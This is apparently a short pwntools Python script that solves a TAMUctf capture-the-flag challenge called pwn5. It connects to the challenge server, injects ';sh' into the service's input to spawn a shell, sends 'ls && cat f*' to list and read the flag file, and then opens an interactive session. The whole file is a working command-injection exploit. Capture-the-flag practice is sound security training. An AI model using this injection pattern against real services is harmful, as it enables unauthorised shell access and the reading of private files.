from pwn import *

def exploit():
	binary = ELF("./pwn5")
	r = remote("pwn.tamuctf.com", 4325)
	r.sendline(";sh")
	r.sendline("ls && cat f*")
	r.interactive()

if __name__ == "__main__":
	exploit()
